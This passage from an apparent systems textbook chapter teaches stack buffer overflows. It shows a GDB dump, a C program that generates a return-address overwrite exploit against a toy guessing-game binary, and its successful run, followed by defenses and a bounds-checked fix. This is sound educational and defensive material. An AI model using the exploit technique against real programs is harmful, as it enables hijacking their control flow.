0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff<br/>&#13;
0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34<br/>&#13;
0xffffd410:     0x35    0x36    0x37    0x38    0x39    0x30    0x31    0x32<br/>&#13;
0xffffd418:     0x33    0x34    0x35    0x36    0x37    0x38    0x39    0x30<br/>&#13;
0xffffd420:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38<br/>&#13;
0xffffd428:     0x39    0x30    0x31    0x32    0x33    0x34    0x00    0xf7</p>&#13;
<p class="indent">Notice that our input string blew past the stated limits of the array <span class="literal">buf</span>, overwriting all the other values stored on the stack. In other words, our string created a buffer overrun and corrupted the call stack, causing the program to crash. This process is also known as <em>smashing the stack</em>.</p>&#13;
<h4 class="h4" id="lev2_161">8.10.5 A Smarter Buffer Overflow: Second Attempt</h4>&#13;
<p class="noindent">Our first example smashed the stack by overwriting the <span class="literal">%ebp</span> register and return address with junk, causing the program to crash. An attacker whose goal is to simply crash a program would be satisfied at this point. However, our goal is to trick the guessing game to return 0, indicating that we won the game. We accomplish this by filling the call stack with data more meaningful than junk values. For example, we could overwrite the stack so that the return address is replaced with the address of <span class="literal">endGame</span>. Then, when the program attempts to return from <span class="literal">main</span>, it will instead execute <span class="literal">endGame</span> rather than crashing with a segmentation fault.</p>&#13;
<p class="indent">To find out the address of <span class="literal">endGame</span>, let’s inspect <span class="literal">secret</span> again in GDB:</p>&#13;
<p class="programs">$ <span class="codestrong1">gdb secret</span><br/>&#13;
(gdb) <span class="codestrong1">disas endGame</span><br/>&#13;
Dump of assembler code for function endGame:<br/>&#13;
   0x08048564 &lt;+0&gt;:     push   %ebp<br/>&#13;
   0x08048565 &lt;+1&gt;:     mov    %esp,%ebp<br/>&#13;
   0x08048567 &lt;+3&gt;:     sub    $0x18,%esp<br/>&#13;
   0x0804856a &lt;+6&gt;:     movl   $0x80486fe,(%esp)<br/>&#13;
   0x08048571 &lt;+13&gt;:    call   0x8048390 &lt;puts@plt&gt;<br/>&#13;
   0x08048576 &lt;+18&gt;:    movl   $0x0,(%esp)<br/>&#13;
   0x0804857d &lt;+25&gt;:    call   0x80483b0 &lt;exit@plt&gt;<br/>&#13;
End of assembler dump.</p>&#13;
<p class="indent">Observe that <span class="literal">endGame</span> starts at address 0x08048564. <a href="ch08.xhtml#ch8fig18">Figure 8-18</a> illustrates a sample exploit that forces <span class="literal">secret</span> to run the <span class="literal">endGame</span> function.</p>&#13;
<div class="imagec" id="ch8fig18"><span epub:type="pagebreak" id="page_455"/><img alt="image" src="../images/08fig18.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-18: A sample string that can force <span class="literal">secret</span> to execute the <span class="literal">endGame</span> function</em></p>&#13;
<p class="indent">Again, since x86 is a little-endian system in which the stack grows toward lower addresses, the bytes in the return address appear to be in reverse order.</p>&#13;
<p class="indent">The following program illustrates how an attacker could construct the preceding exploit:</p>&#13;
<p class="programs">#include &lt;stdio.h&gt;<br/>&#13;
<br/>&#13;
char ebuff[]=<br/>&#13;
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*first 10 bytes of junk*/<br/>&#13;
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*next 10 bytes of junk*/<br/>&#13;
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*following 10 bytes of junk*/<br/>&#13;
"\x31\x32" /*last 2 bytes of junk*/<br/>&#13;
"\x64\x85\x04\x08" /*address of endGame (little endian)*/<br/>&#13;
;<br/>&#13;
<br/>&#13;
int main(void) {<br/>&#13;
    int i;<br/>&#13;
    for (i = 0; i &lt; sizeof(ebuff); i++) { /*print each character*/<br/>&#13;
        printf("%c", ebuff[i]);<br/>&#13;
    }<br/>&#13;
<span epub:type="pagebreak" id="page_456"/>&#13;
    return 0;<br/>&#13;
}</p>&#13;
<p class="indent">The <span class="literal">\x</span> before each number indicates that the number is formatted as the hexadecimal representation of a character. After defining <span class="literal">ebuff[]</span>, the <span class="literal">main</span> function simply prints it out, character by character. To get the associated byte string, compile and run this program as follows:</p>&#13;
<p class="programs">$ <span class="codestrong1">gcc -o genEx genEx.c</span><br/>&#13;
$ <span class="codestrong1">./genEx &gt; exploit</span></p>&#13;
<p class="indent">To use the file <span class="literal">exploit</span> as input to <span class="literal">scanf</span>, it suffices to run <span class="literal">secret</span> with <span class="literal">exploit</span> as follows:</p>&#13;
<p class="programs">$ <span class="codestrong1">./secret &lt; exploit</span><br/>&#13;
Enter secret number:<br/>&#13;
You are so wrong!<br/>&#13;
You win!</p>&#13;
<p class="indent">The program prints out “You are so wrong!” because the string contained in <span class="literal">exploit</span> is <em>not</em> the secret number. However, the program also prints out the string “You win!” Recall, though, that our goal is to trick the program to return 0. In a larger system, where the notion of “success” is tracked by an external program, it is often most important what a program returns, not what it prints out.</p>&#13;
<p class="indent">Checking the return value yields:</p>&#13;
<p class="programs">$ <span class="codestrong1">echo $?</span><br/>&#13;
0</p>&#13;
<p class="indent">Our exploit works! We won the game!</p>&#13;
<h4 class="h4" id="lev2_162">8.10.6 Protecting Against Buffer Overflow</h4>&#13;
<p class="noindent">The example we showed changed the control flow of the <span class="literal">secret</span> executable, forcing it to return a zero value associated with success. However, an exploit like this could do some real damage. Furthermore, some older computer systems <em>executed</em> bytes from stack memory. If an attacker placed bytes associated with assembly instructions on the call stack, the CPU would interpret the bytes as <em>real</em> instructions, enabling the attacker to force the CPU to execute <em>any arbitrary code of their choosing</em>. Fortunately, there are strategies that modern computer systems employ to make it more difficult for attackers to run buffer overflow exploits:</p>&#13;
<div class="ul-none">&#13;
<p class="ul-noindent"><strong>Stack randomization.</strong>   The OS allocates the starting address of the stack at a random location in stack memory, causing the position/size of the call stack to vary from one run of a program to another. Multiple machines running the same code would have different stack addresses. Modern Linux systems use stack randomization as a standard practice. However, a determined attacker can brute force the attack, by attempting <span epub:type="pagebreak" id="page_457"/>to repeat attacks with different addresses. A common trick is to use a <em>NOP sled</em> (or slide), i.e., a large number of <span class="literal">nop</span> instructions, before the actual exploit code. Executing the <span class="literal">nop</span> instruction (<span class="literal">0x90</span>) has no effect, other than causing the program counter to increment to the next instruction. As long as the attacker can get the CPU to execute somewhere in the NOP sled, the NOP sled will eventually lead to the exploit code that follows it. Aleph One’s writeup<sup><a href="ch08.xhtml#fn8_9" id="rfn8_9">9</a></sup> details the mechanism of this type of attack.</p>&#13;
<p class="ul-noindent"><strong>Stack corruption detection.</strong>   Another line of defense is to try to detect when the stack is corrupted. Recent versions of GCC use a stack protector known as a <em>canary</em> that acts as a guard between the buffer and the other elements of the stack. A canary is a value stored in a nonwriteable section of memory that can be compared to a value put on the stack. If the canary “dies” during a program’s execution, the program knows that it is under attack and aborts with an error message. A clever attacker can, however, replace the canary to prevent the program from detecting stack corruption.</p>&#13;
<p class="ul-noindent"><strong>Limiting executable regions.</strong>   In this line of defense, executable code is restricted to only particular regions of memory. In other words, the call stack is no longer executable. However, even this defense can be defeated. In an attack utilizing <em>return-oriented programming</em> (ROP), an attacker can “cherry-pick” instructions in executable regions and jump from instruction to instruction to build an exploit. There are some famous examples of this online, especially in video games.<sup><a href="ch08.xhtml#fn8_10" id="rfn8_10">10</a></sup></p>&#13;
</div>&#13;
<p class="indent">However, the best line of defense is always the programmer. To prevent buffer overflow attacks on your programs, use C functions with <em>length specifiers</em> whenever possible and add code that performs array bounds checking. It is crucial that any defined arrays match the chosen length specifiers. <a href="ch08.xhtml#ch8tab18">Table 8-18</a> lists some common “bad” C functions that are vulnerable to buffer overflow and the corresponding “good” function to use (assume that <span class="literal">buf</span> is allocated 12 bytes).</p>&#13;
<p class="tabcap" id="ch8tab18"><strong>Table 8-18:</strong> C Functions with Length Specifiers</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:50%"/>&#13;
<col style="width:50%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instead of</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Use</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">gets(buf)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">fgets(buf, 12, stdin)</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">scanf("%s", buf)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">scanf("%12s", buf)</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">strcpy(buf2, buf)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">strncpy(buf2, buf, 12)</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">strcat(buf2, buf)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">strncat(buf2, buf, 12)</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">sprintf(buf, "%d", num)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">snprintf(buf, 12, "%d", num)</span></p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">The <span class="literal">secret2</span> binary<sup><a href="ch08.xhtml#fn8_11" id="rfn8_11">11</a></sup> no longer has the buffer overflow vulnerability. Here’s the <span class="literal">main</span> function of this new binary:</p>&#13;
<p class="margnote">main2.c</p>&#13;
<p class="programs">#include &lt;stdio.h&gt;<br/>&#13;
#include &lt;stdlib.h&gt;<br/>&#13;
#include "other.h" //contain secret function definitions<br/>&#13;
<span epub:type="pagebreak" id="page_458"/>&#13;
<br/>&#13;
/*prints out the You Win! message*/<br/>&#13;
void endGame(void) {<br/>&#13;
    printf("You win!\n");<br/>&#13;
    exit(0);<br/>&#13;
}<br/>&#13;
<br/>&#13;
/*main function of the game*/<br/>&#13;
int main() {<br/>&#13;
    int guess, secret, len;<br/>&#13;
    char buf[12]; //buffer (12 bytes long)<br/>&#13;
<br/>&#13;
    printf("Enter secret number:\n");<br/>&#13;
    scanf("%12s", buf); //read guess from user input (fixed!)<br/>&#13;
    guess = atoi(buf); //convert to an integer<br/>&#13;
<br/>&#13;
    secret=getSecretCode(); //call the getSecretCode function<br/>&#13;
<br/>&#13;
    //check to see if guess is correct<br/>&#13;
    if (guess == secret) {<br/>&#13;
        printf("You got it right!\n");<br/>&#13;
    }<br/>&#13;
    else {<br/>&#13;
        printf("You are so wrong!\n");<br/>&#13;
        return 1; //if incorrect, exit<br/>&#13;
    }<br/>&#13;
<br/>&#13;
    printf("Enter the secret string to win:\n");<br/>&#13;
    scanf("%12s", buf); //get secret string from user input (fixed!)<br/>&#13;
<br/>&#13;
    guess = calculateValue(buf, strlen(buf)); //call calculateValue function<br/>&#13;
<br/>&#13;
    //check to see if guess is correct<br/>&#13;
    if (guess != secret) {<br/>&#13;
        printf("You lose!\n");<br/>&#13;
        return 2; //if guess is wrong, exit<br/>&#13;
    }<br/>&#13;
<br/>&#13;
    /*if both the secret string and number are correct<br/>&#13;
    call endGame()*/<br/>&#13;
    endGame();<br/>&#13;
<br/>&#13;
    return 0;<br/>&#13;
}</p>&#13;
<p class="indent">Notice that we added a length specifier to all calls of <span class="literal">scanf</span>, causing the <span class="literal">scanf</span> function to stop reading from the input after the first 12 bytes are read. The exploit string no longer breaks the program:</p>&#13;
<span epub:type="pagebreak" id="page_459"/>&#13;
<p class="programs">$ <span class="codestrong1">./secret2 &lt; exploit</span><br/>&#13;
Enter secret number:<br/>&#13;
You are so wrong!<br/>&#13;
$ <span class="codestrong1">echo $?</span><br/>&#13;
1</p>&#13;
<p class="indent">Of course, any reader with basic reverse-engineering skills can still win the guessing game by analyzing the assembly code. If you haven’t tried to beat the program yet with reverse engineering, we encourage you to do so now.</p>&#13;
<h3 class="h3" id="lev1_72">Notes</h3>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_1" id="fn8_1">1.</a> Edsger Dijkstra,“Go To Statement Considered Harmful,” <em>Communications of the ACM</em> 11(3), pp. 147–148, 1968.</p>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_2" id="fn8_2">2.</a> <em><a href="https://diveintosystems.org/book/C8-IA32/recursion.html">https://diveintosystems.org/book/C8-IA32/recursion.html</a></em></p>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_3" id="fn8_3">3.</a> Mohit Kumar, “Critical Skype Bug Lets Hackers Remotely Execute Malicious Code,” <em><a href="https://thehackernews.com/2017/06/skype-crash-bug.html">https://thehackernews.com/2017/06/skype-crash-bug.html</a></em>, 2017.</p>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_4" id="fn8_4">4.</a> Tamir Zahavi-Brunner, “CVE-2017-13253: Buffer overflow in multiple Android DRM services,” <em><a href="https://blog.zimperium.com/cve-2017-13253-buffer-overflow-multiple-android-drm-services/">https://blog.zimperium.com/cve-2017-13253-buffer-overflow-multiple-android-drm-services/</a></em>, 2018.</p>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_5" id="fn8_5">5.</a> Tom Spring, “Google Patches ‘High Severity’ Browser Bug,” <em><a href="https://threatpost.com/google-patches-high-severity-browser-bug/128661/">https://threatpost.com/google-patches-high-severity-browser-bug/128661/</a></em>, 2017.</p>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_6" id="fn8_6">6.</a> Christopher Kelty, “The Morris Worm,” <em>Limn Magazine</em>, Issue 1: Systemic Risk, 2011. <em><a href="https://limn.it/articles/the-morris-worm/">https://limn.it/articles/the-morris-worm/</a></em></p>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_7" id="fn8_7">7.</a> David Auerbach, “Chat Wars: Microsoft vs. AOL,” <em>NplusOne Magazine</em>, Issue 19, Spring 2014. <em><a href="https://nplusonemag.com/issue-19/essays/chat-wars/">https://nplusonemag.com/issue-19/essays/chat-wars/</a></em></p>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_8" id="fn8_8">8.</a> <em><a href="https://diveintosystems.org/book/C8-IA32/_attachments/secret.tar.gz">https://diveintosystems.org/book/C8-IA32/_attachments/secret.tar.gz</a></em></p>&#13;
<p class="fnote"><a href="ch08.xhtml#rfn8_9" id="fn8_9">9.</a> Aleph One, “Smashing the Stack for Fun and Profit,” <em><a href="http://insecure.org/stf/smashstack.html">http://insecure.org/stf/smashstack.html</a></em>, 1996.</p>&#13;
<p class="fnote1"><a href="ch08.xhtml#rfn8_10" id="fn8_10">10.</a> DotsAreCool, “Super Mario World Credit Warp” (Nintendo ROP example), <em><a href="https://youtu.be/vAHXK2wut_I">https://youtu.be/vAHXK2wut_I</a></em>, 2015.</p>&#13;
<p class="fnote1"><a href="ch08.xhtml#rfn8_11" id="fn8_11">11.</a> <em><a href="https://diveintosystems.org/book/C8-IA32/_attachments/secret2.tar.gz">https://diveintosystems.org/book/C8-IA32/_attachments/secret2.tar.gz</a></em><span epub:type="pagebreak" id="page_460"/></p>&#13;
</body></html>